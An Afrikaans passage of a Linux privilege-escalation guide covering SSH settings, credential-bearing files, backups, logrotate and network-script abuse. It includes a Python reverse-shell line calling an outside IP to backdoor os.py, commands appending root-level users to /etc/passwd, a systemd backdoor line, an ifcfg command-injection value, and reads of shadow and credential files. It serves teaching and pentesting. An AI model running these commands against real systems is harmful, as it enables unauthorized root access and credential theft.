Kyk na **Valentine box from HTB** vir ’n voorbeeld.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Sleutels wat gedurende die historiese kwesbare tydperk met geraakte Debian- of afgeleide OpenSSL-bouweergawes gegenereer is, kan voorspelbare ewekansigheid hê; die gasheer se huidige verspreiding of gelapte OpenSSL-weergawe bepaal nie hoe ’n ouer sleutel gegenereer is nie. Gaan die **spesifieke sleutel** na teen ’n geskikte historiese swartlys en verifieer die herkoms daarvan. Debian se [`ssh-vulnkey` manual](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) beskryf hoe om publieke sleutels en `authorized_keys` na te gaan, en [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) teken die OpenSSL-regstelling aan. ’n Inskrywing in ’n bevoorregte rekening se `authorized_keys` is slegs ’n leidraad vir eskalasie as die ooreenstemmende private sleutel herwin kan word en die effektiewe SSH-beleid steeds daardie sleutel vir daardie rekening aanvaar; ’n swak **host**-sleutel is nie op sigself ’n login-bewys nie. Vervang gekompromitteerde sleutels en verwyder hul ou magtigings.

### Interessante SSH-konfigurasiewaardes

- **PasswordAuthentication:** Spesifiseer of wagwoordverifikasie toegelaat word. Die upstream OpenSSH-verstekwaarde is `yes`; verspreidingskonfigurasie kan dit oorskryf.
- **PubkeyAuthentication:** Spesifiseer of publieke sleutelverifikasie toegelaat word. Die verstekwaarde is `yes`.
- **PermitEmptyPasswords**: Wanneer wagwoordverifikasie toegelaat word, spesifiseer dit of die bediener login toelaat vir rekeninge met leë wagwoordstringe. Die verstekwaarde is `no`.

### Loginbeheer-lêers

Hierdie lêers beïnvloed wie kan login en hoe:

- **`/etc/nologin`**: indien teenwoordig, blokkeer dit nie-root-logins en vertoon dit sy boodskap.
- **`/etc/securetty`**: beperk waar root kan login (TTY-toegelatelys).
- **`/etc/motd`**: banier ná login (kan omgewings- of instandhoudingsbesonderhede uitlek).

### PermitRootLogin

Spesifiseer of root met ssh kan login. Die upstream OpenSSH-verstekwaarde is `prohibit-password`; verspreidingskonfigurasie kan dit oorskryf. Moontlike waardes:

- `yes`: root kan met ’n wagwoord en private sleutel login
- `without-password` of `prohibit-password`: root kan slegs met ’n private sleutel login
- `forced-commands-only`: Root kan slegs met ’n private sleutel login, en slegs as die command-opsies gespesifiseer is
- `no` : nee

### Vertroude SSH-gebruikersertifikaatowerhede

`TrustedUserCAKeys` benoem publieke sleutels wat sshd vertrou om **gebruikers**-sertifikate te onderteken. As die ooreenstemmende private CA-sleutel leesbaar is vir ’n gebruiker met laer voorregte, ondersoek wie ’n sertifikaat kan kry en as watter rekening-principals dit kan verifieer. `AuthorizedPrincipalsFile` of `AuthorizedPrincipalsCommand` kan die aanvaarbare name beperk; indien nie een van die twee gekonfigureer is nie, moet die sertifikaat die teikenrekening se naam bevat. `PermitRootLogin prohibit-password` blokkeer root-wagwoordverifikasie, maar kan steeds sertifikaatverifikasie toelaat. ’n Blootgestelde sleutelpad alleen bewys nie toegang nie: bevestig die publieke/private sleutel-paar, effektiewe `Match`-reëls, rekeningbeleid, sleutelwagwoordfrase, herroeping en aanvaarbare handtekeningalgoritmes. Moenie private-sleutelgrepe in enumerasie-uitvoer insluit nie. Sien die [OpenSSH server configuration manual](https://man.openbsd.org/sshd_config#TrustedUserCAKeys).

’n Private CA-sleutel kan ook bruikbaar wees **sonder dat dit leesbaar is** vir die huidige gebruiker, as ’n voorregdelegeringsreël daardie gebruiker toelaat om ’n onbeperkte [sertifikaatondertekenaar soos `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s) onder die sleuteleienaar se identiteit aan te roep. Vergelyk die presiese toegelate command en argumente met die ondertekenaarrekening se toegang tot die sleutel, die publieke CA wat deur die effektiewe sshd-konfigurasie vertrou word, die principal wat vir die teikenrekening aanvaar word, sertifikaatgeldigheid en daardie rekening se login-beleid. ’n Gedelegeerde ondertekenaar-command of ’n vertroude CA-lêer alleen bewys nie toegang tot ’n ander rekening nie; moenie ’n toetssertifikaat onderteken tydens passiewe enumerasie nie.

### AuthorizedKeysFile

Spesifiseer lêers wat die publieke sleutels bevat wat vir gebruikersverifikasie gebruik kan word. Dit kan tokens soos `%h` bevat, wat deur die tuisgids vervang word. **Jy kan absolute paaie aandui** (wat met `/` begin) of **relatiewe paaie vanaf die gebruiker se tuisgids**. Byvoorbeeld:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

Daardie konfigurasie dui aan dat as jy met die **private** sleutel van die gebruiker "**testusername**" probeer aanmeld, ssh die publieke sleutel van jou sleutel sal vergelyk met dié in `/home/testusername/.ssh/authorized_keys` en `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH-agent-aanstuur laat jou toe om **jou plaaslike SSH-sleutels te gebruik in plaas daarvan om sleutels** (sonder wagwoordfrases!) op jou bediener te laat lê. Jy sal dus via ssh **na ’n host kan spring** en van daar af **na ’n ander host kan spring deur** die **sleutel** te gebruik wat op jou **aanvanklike host** geleë is.

Jy moet hierdie opsie soos volg in `$HOME/.ssh.config` stel:

```
Host example.com
  ForwardAgent yes
```

Noticeer dat indien `Host` elke keer `*` is wanneer die gebruiker na ’n ander masjien oorskakel, daardie gasheer toegang tot die sleutels sal hê (wat ’n sekuriteitskwessie is).

Die lêer `/etc/ssh_config` kan hierdie **opsies** **oorheers** en hierdie konfigurasie toelaat of weier.\
Die lêer `/etc/sshd_config` kan ssh-agent-aanstuur toelaat of weier met die sleutelwoord `AllowAgentForwarding` (verstek is toelaat).

As jy sien dat Forward Agent in ’n omgewing opgestel is, lees die volgende bladsy, want **jy kan dit dalk misbruik om voorregte te verhoog**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Interessante lêers

### Profiel-lêers

Die lêer `/etc/profile` en die lêers in `/etc/profile.d/` is **skrifte wat uitgevoer word wanneer ’n gebruiker ’n nuwe shell begin**. Daarom, as jy enige daarvan kan **skryf of wysig, kan jy voorregte verhoog**.

```bash
ls -l /etc/profile /etc/profile.d/
```

As enige vreemde profile script gevind word, moet jy dit nagaan vir **sensitiewe besonderhede**.

### Passwd/Shadow-lêers

Afhangende van die OS, kan die `/etc/passwd`- en `/etc/shadow`-lêers ’n ander naam hê, of daar kan ’n rugsteun wees. Daarom word dit aanbeveel om **almal te vind** en **te kyk of jy dit kan lees** om te sien **of daar hashes in die lêers is**:

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

In sommige gevalle kan jy **wagwoord-hashes** in die `/etc/passwd`-lêer (of ekwivalent) vind.

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### Skryfbare /etc/passwd

Genereer eers ’n wagwoord met een van die volgende opdragte.

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Voeg dan die gebruiker `hacker` by en voeg die gegenereerde wagwoord by.

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

Bv.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Jy kan nou die `su`-opdrag met `hacker:hacker` gebruik.

Alternatiewelik kan jy die volgende reëls gebruik om ’n dummygebruiker sonder ’n wagwoord by te voeg.\
WAARSKUWING: jy kan die huidige sekuriteit van die masjien verswak.

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

LET WEL: Op BSD-platforms is `/etc/passwd` by `/etc/pwd.db` en `/etc/master.passwd` geleë; `/etc/shadow` word ook na `/etc/spwd.db` hernoem.

Jy moet nagaan of jy **na sommige sensitiewe lêers kan skryf**. Kan jy byvoorbeeld na ’n **dienskonfigurasielêer** skryf?

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

Byvoorbeeld, as die masjien ’n **tomcat**-bediener gebruik en jy die **Tomcat-dienskonfigurasielêer binne /etc/systemd/** kan wysig, kan jy die reëls wysig:

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

Jou backdoor sal uitgevoer word wanneer tomcat volgende keer begin word.

### Gaan vouers na

Die volgende vouers kan rugsteunkopieë of interessante inligting bevat: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Jy sal waarskynlik nie die laaste een kan lees nie, maar probeer)

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### Vreemde liggings/lêers wat besit word

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### Lêers wat die afgelope minute gewysig is

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Sqlite DB-lêers

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

Vir leesbare toepassingsdatabasisse, ondersoek tabel- en kolomname vir gebruikersname en wagwoordhashes. Om ’n hash te vind, die wagwoord daarvan te herwin en te bewys dat dit vir ’n plaaslike rekening hergebruik word, is afsonderlike stappe; ’n generiese 32-karakter-heksadesimale string is nie genoeg om MD5 of toegang tot ’n rekening af te lei nie.

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml-lêers

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

As ’n leesbare shell history ’n `sudo`-opdrag bevat wat gevolg word deur ’n kort reël wat soos ’n wagwoord lyk, inspekteer die omliggende reëls handmatig. ’n Wagwoord wat by die gewone `sudo`-prompt ingevoer word, word nie in shell history gestoor nie; ’n daaropvolgende reël is slegs moontlik per ongeluk as shell-invoer ingevoer, en is nie bewys van ’n geldige wagwoord nie. Die `.sudo_as_admin_successful`-merker teken vorige gebruik aan, nie huidige magtiging nie.

### Versteekte lêers

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **Skripte/Binaries in PATH**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **Weblêers**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **Rugsteune**

Inspekteer leesbare lêers in rugsteungidse, asook lêers waarvan die **name** `backup` bevat: 'n argief met 'n ondeursigtige naam of 'n geënkripteerde uitbreiding kan steeds ou toepassingdata blootstel. 'n Geënkripteerde argief is slegs 'n moontlike blootstelling. Wagwoordherwinning, inspeksie van die inhoud, herwinning van 'n toepassinghash en hergebruik van daardie wagwoord vir 'n Unix-rekening is afsonderlike stappe wat geverifieer moet word; 'n hash in 'n argief bewys nie dat plaaslike aanmelding moontlik is nie.

Leesbare virtuelemasjien-rugsteune verdien dieselfde ondersoek. 'n VirtualBox `.vbox`-konfigurasie kan aangehegte `.vdi`-beelde identifiseer en metadata vir geënkripteerde skyfsleutels bevat; [VirtualBox dokumenteer dat die geënkripteerde datasleutel in die VM-konfigurasie gestoor word](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html). Beide die konfigurasie en die beeld moet toeganklik wees voordat 'n vanlyn skyfinspeksie moontlik is. 'n Gastvolume kan sy eie [LUKS-enkripsielaag](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc) hê, wat 'n aparte sleutel vereis. Selfs ná gemagtigde dekripsie kan ou skrifte of konfigurasies 'n wagwoord bevat; bepaal of die aanmeldbesonderheid steeds geldig is vir 'n gasheerrekening en of die rekening se effektiewe `sudo`-beleid 'n bevoorregte opdrag toelaat voordat jy dit plaaslike privilege escalation noem. Inventariseer paaie en toestemmings sonder om beelde tydens passiewe enumerasie te kopieer, te dekripteer of te monteer.

Wanneer jy 'n leesbare argief inspekteer, lys die lêername van die inhoud voordat jy enigiets uitpak: verborge authenticator-lêers, materiaal met herstelkodes of SSH-sleutels kan teenwoordig wees, selfs al is die aktiewe kopieë beskerm. Lêername dui slegs op 'n moontlike leidraad; verifieer die materiaal en enige hergebruik van rekeningbesonderhede afsonderlik.

Prioritiseer **leesbare argiewe wat aan 'n ander gebruiker behoort** in rugsteungidse, veral argiewe wat aan root behoort en dié wat deur groeplidmaatskap toeganklik is. 'n Ou argief kan 'n konfigurasie of geheime aanmeldbesonderheid bevat, selfs wanneer die aktiewe kopie beskerm is. Vir 'n plaaslike rugsteun-UI soos [Backrest](https://garethgeorge.github.io/backrest/), kontroleer die diens se effektiewe rekening en of 'n gebruiker met laer voorregte sy konfigurasie kan lees of by die UI kan aanmeld. Sy [hooks](https://garethgeorge.github.io/backrest/docs/hooks) en [restic-opdragkoppelvlak](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto) kan met die daemon se lêer- en opdragvoorregte werk; 'n loopback-listener op sigself bepaal nie die impak nie. Backrest se `passwordBcrypt` is 'n base64-geënkodeerde bcrypt-hash in sy [authentiseringskode](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go), nie 'n gewonetekswagwoord nie. Bevestig die diensidentiteit, bruikbare aanmeldbesonderhede en toegang tot die betrokke plan of bewaarplek voordat jy 'n blootgestelde argief of UI as 'n voorregtegrens beskou.

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### Bekende lêers wat wagwoorde bevat

Lees die kode van [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS); dit soek na **verskeie moontlike lêers wat wagwoorde kan bevat**.\
**Nog ’n interessante hulpmiddel** wat jy hiervoor kan gebruik, is: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), ’n oopbrontoepassing wat gebruik word om talle wagwoorde te herwin wat op ’n plaaslike rekenaar vir Windows, Linux en Mac gestoor is.

As `/etc/guacamole/guacamole.properties` leesbaar is, gaan die `mysql-*`-, `postgresql-*`- of `sqlserver-*`-databasisverbindinginstellings na. As die rekening gemagtig is om die Guacamole JDBC-tabelle te lees, kan `guacamole_connection_parameter` gestoorde SSH-waardes vir `username`, `password`, `private-key` of `passphrase` bevat. Begin met die verbinding-ID’s en parametername, en ondersoek dan net die relevante rye; ’n gestoorde waarde kan ’n dinamiese token of ’n kluisverwysing wees eerder as ’n herbruikbare geheim. Sien die [Guacamole JDBC-skema](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) en [SSH-verbindingsparameters](https://guacamole.apache.org/doc/gug/configuring-guacamole.html).

Die [pswm-wagwoordbestuurder](https://github.com/Julynx/pswm#usage) stoor by verstek ’n geënkripteerde kluis by `~/.local/share/pswm/pswm`. As ’n ander gebruiker se kluis sigbaar is, gaan die eienaarskap daarvan na en kyk of jou rekening dit werklik kan lees. Die kluispad alleen verklap nie geloofsbriewe nie; om die hoofwagwoord te herwin, ’n herbruikbare rekeningwagwoord te vind en te bevestig dat daardie rekening se voorregte hoër is, is afsonderlike stappe.

[Passpie se verstekdatabasis](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) is `~/.passpie/`, met ’n `.keys`-sleutelring en geënkripteerde `.pass`-geloofsbrieflêers in groepgidse. ’n Sigbare databasisgids is net ’n leidraad na ’n pad: bevestig toegang tot die sleutel en die relevante geënkripteerde inskrywing, enige vereiste hoofwagwoordfrase, en of ’n herwinde geloofsbrief aan ’n rekening met hoër voorregte behoort. Passpie ondersteun ook [pasgemaakte databasispaadjies](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases), dus dek die verstekpad nie alle moontlikhede nie. Outomatiese enumerasie behoort metadata te lys sonder om geloofsbriewe uit te voer of sleuteldata te vertoon.

### Logboeke

As jy logboeke kan lees, kan jy dalk **interessante/vertroulike inligting daarin vind**. Hoe vreemder die logboek is, hoe interessanter sal dit wees (waarskynlik).\
Sommige "**sleg**" opgestelde (met ’n agterdeur?) **ouditlogboeke** kan jou ook toelaat om **wagwoorde in ouditlogboeke op te neem**, soos in hierdie plasing verduidelik word: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

Om **logs te lees, sal die groep** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) **baie nuttig wees**.

### Shell-lêers

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### Generic Creds Search/Regex

Jy moet ook kyk vir lêers met die woord "**password**" in die **naam** of binne die **inhoud**, en ook vir IP's en e-posadresse in logs, of hashes-regexps.\
Ek gaan nie hier lys hoe om dit alles te doen nie, maar as jy belangstel, kan jy die laaste kontroles nagaan wat [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) uitvoer.

## Skryfbare lêers

### Python library hijacking

As jy weet **waar** 'n python script uitgevoer gaan word en jy **in daardie vouer kan skryf** of **python libraries kan wysig**, kan jy die OS library wysig en dit backdoor (as jy kan skryf waar die python script uitgevoer gaan word, kopieer en plak die os.py library).

Om die library te **backdoor**, voeg net die volgende reël aan die einde van die os.py library by (verander IP en PORT):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

### Logrotate exploitation

’n Bevoorregte `logrotate`-taak kan ’n lêerskryfpad tussen gebruikers skep wanneer dit werklik ’n logboek roteer onder ’n gids wat ’n gebruiker met laer voorregte tydens die rotasie kan vervang of herlei. ’n Skryfbare logboek alleen is net ’n leidraad. Bevestig die presiese aktiewe reël en die `create`-, `olddir`- en `su`-direktiewe; die skeduleerder se effektiewe identiteit; skryf- en soekregte op die logboek se ouergids; en of die geïnstalleerde bou en beleid die bestemmingsverandering toelaat. ’n Latere bevoorregte dop moet ook die resulterende lêer laai voordat ’n skryfaksie na ’n opstartlêer tot beveluitvoering kan lei. Gaan die skedule, reël, weergawe/verpakking en padmetadata na sonder om ’n rotasie te aktiveer of die wedloop te probeer.

> [!TIP]
> Moenie `3.18.0` of enige weergawe-string op sigself as ’n grens vir uitbuitbaarheid beskou nie. [Upstream se veranderingslogboek](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) teken verharding teen gidse en simboliese skakels in verskeie vrystellings aan, en verspreidings kan regstellings terugporteer. Die [upstream-handleiding](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in) beveel `su` aan wanneer root logboeke in gidse roteer wat deur gebruikers sonder bevoorregting beheer word; verifieer die effektiewe reël en werklike gedrag.

Meer gedetailleerde inligting oor die kwesbaarheid is op hierdie bladsy beskikbaar: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Jy kan hierdie kwesbaarheid met [**logrotten**](https://github.com/whotwagner/logrotten) uitbuit.

Hierdie kwesbaarheid is baie soortgelyk aan [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx-logboeke),** so wanneer jy ontdek dat jy logboeke kan wysig, kyk wie daardie logboeke bestuur en of jy voorregte kan verhoog deur die logboeke met simboliese skakels te vervang.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Kwesbaarheidsverwysing:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

’n `ifcfg-*`-lêer is ’n ondersoekleidraad wanneer ’n gebruiker met laer voorregte dit kan skep of verander **en** ’n bevoorregte netwerkaktiveringspad daardie presiese lêer sal lees. Bevestig die effektiewe lêer- en gidstoestemmings, die gekose koppelvlak, die geïnstalleerde `ifup`-/`ifdown`-implementering en wie dit aanroep. ’n Skryfbare lêer alleen veroorsaak nie uitvoering nie. [Red Hat se RHEL 7-netwerkgids](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files) onderskei verouderde netwerkskripte van NetworkManager: laasgenoemde aktiveer nie self eersgenoemde nie. [RHEL 8-dokumentasie](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking) meld dat die verstek-`ifup`/`ifdown` NetworkManager gebruik, terwyl die opsionele verouderde pakket dopskripte verskaf.

Op ’n stelsel wat werklik bevoorregte verouderde skripte gebruik, kan ’n ongekwoteerde, deur die dop ingeleesde `ifcfg-*`-toewysing soos `NAME=` ’n kode-uitvoeringsgrens oorsteek. Verifieer die presiese ontleder, waarde en aktiveringspad; moenie dopinterpretasie aflei uit die lêernaam of die teenwoordigheid van NetworkManager nie. ’n `sudo`-toegelate omhulsel wat oproeperinvoer na ’n `ifcfg-*`-lêer skryf en dan verouderde `ifup` aanroep, bied ’n afsonderlike pad na hierdie grens, selfs wanneer die oproeper nie die lêer direk kan wysig nie.

Byvoorbeeld: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_Let op die spasie tussen Network en /bin/id_)

### **init, init.d, systemd en rc.d**

Die gids `/etc/init.d` bevat **scripts** vir System V init (SysVinit), die **klassieke Linux-diensbestuurstelsel**. Dit bevat scripts om dienste te `start`, `stop`, `restart` en soms te `reload`. Jy kan hulle direk uitvoer of via simboliese skakels in `/etc/rc?.d/`. ’n Alternatiewe pad in Redhat-stelsels is `/etc/rc.d/init.d`.

Daarteenoor word `/etc/init` met **Upstart** geassosieer, ’n nuwer **diensbestuurstelsel** wat deur Ubuntu bekendgestel is en konfigurasielêers vir diensbestuurstake gebruik. Ondanks die oorgang na Upstart word SysVinit-scripts steeds saam met Upstart-konfigurasies gebruik, danksy ’n versoenbaarheidslaag in Upstart.

**systemd** is ’n moderne inisialisering- en diensbestuurder met gevorderde funksies soos die op-aanvraag begin van daemons, outomatiese montering en momentopnames van stelseltoestande. Dit organiseer lêers in `/usr/lib/systemd/` vir verspreidingspakkette en `/etc/systemd/system/` vir administrateurwysigings, wat stelseladministrasie vereenvoudig.<sup>[[21]](#references)</sup>

## Ander truuks

### NFS-eskalasie van voorregte


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Ontsnap uit beperkte Shells


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android-rootingraamwerke: misbruik van manager-kanale

Android-rootingraamwerke haak dikwels by ’n syscall in om bevoorregte kernelfunksionaliteit aan ’n userspace-manager beskikbaar te stel. Swak manager-verifikasie (bv. handtekeningkontroles wat op FD-volgorde gegrond is, of swak wagwoordskemas) kan ’n plaaslike app in staat stel om die manager na te boots en na root te eskaleer op toestelle wat reeds geroot is. Kom hier meer te wete oor die besonderhede en uitbuiting:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools-diensontdekking-LPE (CWE-426) via regex-gebaseerde exec (CVE-2025-41244)

Regex-gedrewe diensontdekking in VMware Tools/Aria Operations kan ’n binêre pad uit prosesopdragreëls haal en dit met -v in ’n bevoorregte konteks uitvoer. Toegeeflike patrone (bv. dié wat \S gebruik) kan luisterprosesse wat deur ’n aanvaller in skryfbare liggings (bv. /tmp/httpd) geplaas is, pas, wat tot uitvoering as root kan lei (CWE-426 Untrusted Search Path).<sup>[[27]](#references)</sup>

Kom hier meer te wete en sien ’n veralgemeende patroon wat op ander ontdekking-/moniteringstapels van toepassing is:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernelsekuriteitsbeskerming

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Meer hulp

[Statiese impacket-binêre lêers](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Beste hulpmiddel om plaaslike Linux-eskalasie-van-voorregte-vektore te soek:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t-opsie)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernelfoute in Linux en MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (fisiese toegang):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Samestelling van meer scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [1] [0xdf – HTB Planning (Crontab UI-eskalasie van voorregte, hergebruik van zip -P-bewyse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: vervalste .text_sig-loon vir cron-uitgevoerde monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: omseiling van Neighborhood Watch (sudo env_keep PATH-oorname)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Basiese Linux-eskalasie van voorregte](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Gids vir Linux-eskalasie van voorregte](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Aanval en verdediging: Linux-eskalasie-van-voorregte-tegnieke van 2016](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [Niemand verwag opdraguitvoering nie!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (Linux-eskalasie van voorregte)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Deurloop van laboratoriumoefeninge - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: Wenke en truuks vir Linux-eskalasie van voorregte](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
